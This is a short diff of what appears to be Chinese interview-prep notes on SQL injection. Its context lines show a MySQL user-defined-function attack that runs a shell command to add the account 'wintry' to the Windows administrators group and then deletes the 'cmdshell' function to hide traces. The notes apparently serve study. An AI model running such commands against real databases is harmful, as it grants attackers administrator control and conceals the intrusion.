@@ -94,7 +94,6 @@ select cmdshell ('net localgroup administrators wintry /add');
 drop function cmdshell;
 delete from mysql.func where name ='cmdshell';
 ```
-# 面试复习
 ## sql注入总结
 ##总体见解：
 1.只要是支持批处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。
